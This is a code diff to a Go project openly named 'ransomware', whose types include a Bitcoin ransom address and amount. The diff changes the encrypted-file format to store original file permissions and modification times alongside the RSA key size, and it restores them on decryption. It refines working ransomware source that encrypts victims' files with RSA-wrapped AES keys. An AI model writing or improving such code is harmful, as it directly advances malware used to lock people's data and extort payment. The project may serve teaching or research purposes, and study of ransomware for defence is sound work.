@@ -11,6 +11,7 @@ import (
 	"path/filepath"
 	"strings"
 	"text/template"
+	"time"
 
 	"github.com/marmos91/ransomware/crypto"
 	"github.com/marmos91/ransomware/fs"
@@ -22,6 +23,30 @@ type ransomData struct {
 	BitcoinAddress string
 	BitcoinCount   float64
 	PublicKey      string
+}
+
+// fileHeader holds metadata written at the start of each encrypted file.
+type fileHeader struct {
+	KeySizeBits uint16
+	FileMode    uint32
+	ModTime     int64
+}
+
+// newFileHeader creates a fileHeader from file metadata and the RSA key size.
+func newFileHeader(info os.FileInfo, keySizeBits uint16) fileHeader {
+	return fileHeader{
+		KeySizeBits: keySizeBits,
+		FileMode:    uint32(info.Mode().Perm()),
+		ModTime:     info.ModTime().Unix(),
+	}
+}
+
+func (h *fileHeader) writeTo(w io.Writer) error {
+	return binary.Write(w, binary.BigEndian, h)
+}
+
+func (h *fileHeader) readFrom(r io.Reader) error {
+	return binary.Read(r, binary.BigEndian, h)
 }
 
 func loadPublicKey(path string) (*rsa.PublicKey, error) {
@@ -264,6 +289,11 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keyS
 	}
 	defer func() { _ = src.Close() }()
 
+	srcInfo, err := src.Stat()
+	if err != nil {
+		return err
+	}
+
 	outPath := path + encSuffix
 	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	if err != nil {
@@ -278,9 +308,9 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keyS
 		}
 	}()
 
-	// Write key size header (2 bytes, big-endian) for self-describing format.
-	if err := binary.Write(dst, binary.BigEndian, keySizeBits); err != nil {
-		return fmt.Errorf("write key size header: %w", err)
+	hdr := newFileHeader(srcInfo, keySizeBits)
+	if err := hdr.writeTo(dst); err != nil {
+		return fmt.Errorf("write file header: %w", err)
 	}
 
 	if _, err := dst.Write(encryptedAesKey); err != nil {
@@ -297,20 +327,19 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 	}
 	defer func() { _ = src.Close() }()
 
-	// Read key size header to determine RSA key size.
-	var keySizeBits uint16
-	if err := binary.Read(src, binary.BigEndian, &keySizeBits); err != nil {
-		return fmt.Errorf("read key size header: %w", err)
+	var hdr fileHeader
+	if err := hdr.readFrom(src); err != nil {
+		return fmt.Errorf("read file header: %w", err)
 	}
 
-	if !validKeySizes[int(keySizeBits)] {
-		return fmt.Errorf("invalid key size in file header: %d bits", keySizeBits)
+	if !validKeySizes[int(hdr.KeySizeBits)] {
+		return fmt.Errorf("invalid key size in file header: %d bits", hdr.KeySizeBits)
 	}
 
-	keySizeBytes := int(keySizeBits) / 8
+	keySizeBytes := int(hdr.KeySizeBits) / 8
 	if keySizeBytes != rsaPrivateKey.Size() {
 		return fmt.Errorf("key size mismatch: file encrypted with %d-bit key, but private key is %d-bit",
-			keySizeBits, rsaPrivateKey.Size()*8)
+			hdr.KeySizeBits, rsaPrivateKey.Size()*8)
 	}
 
 	encryptedKey := make([]byte, keySizeBytes)
@@ -324,7 +353,8 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 	}
 
 	outPath := strings.TrimSuffix(path, encSuffix)
-	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
+	perm := os.FileMode(hdr.FileMode) & os.ModePerm
+	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)
 	if err != nil {
 		return err
 	}
@@ -337,13 +367,22 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 		}
 	}()
 
-	return crypto.AesDecryptStream(src, dst, aesKey)
+	if err := crypto.AesDecryptStream(src, dst, aesKey); err != nil {
+		return err
+	}
+
+	// Restore original permissions (also covers existing files where create mode is ignored).
+	if err := dst.Chmod(perm); err != nil {
+		return fmt.Errorf("restore permissions: %w", err)
+	}
+
+	// Restore original modification time.
+	modTime := time.Unix(hdr.ModTime, 0)
+	return os.Chtimes(outPath, modTime, modTime)
 }
 
-// splitCommaSeparated splits a comma-separated string into a slice.
-// Returns nil for empty or whitespace-only input. Trims whitespace from
-// each token and drops empty entries to handle inputs like ".txt, .doc"
-// or trailing commas like ".txt,".
+// splitCommaSeparated splits a comma-separated string into a trimmed slice,
+// returning nil for empty input.
 func splitCommaSeparated(s string) []string {
 	s = strings.TrimSpace(s)
 	if s == "" {
